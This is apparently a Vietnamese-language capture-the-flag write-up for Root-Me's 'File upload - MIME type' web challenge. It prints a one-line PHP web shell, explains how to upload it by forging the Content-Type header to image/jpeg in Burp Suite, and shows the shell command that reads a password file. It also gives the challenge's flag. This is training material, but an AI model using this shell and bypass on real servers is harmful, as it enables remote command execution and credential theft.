# [File upload - MIME type](https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type)

## Solutions

- Tạo file `test.php` có nội dung là:

```php
<?php
system($_GET['command']);
?>
```

- Sử dụng burp suite để chỉnh sửa http request khi upload file `test.php`:
  - Sửa đổi header: `Content-Type: image/jpeg`
  - => upload file thành công

- Gửi request đến nơi chứa file `test.php` với request query parameter là `?command=cat ../../../.passwd`

- Password xuất hiện trong response: `a7n4nizpgQgnPERy89uanf6T4`

## References

- <https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Secure%20file%20upload%20in%20PHP%20web%20applications.pdf?_gl=1>
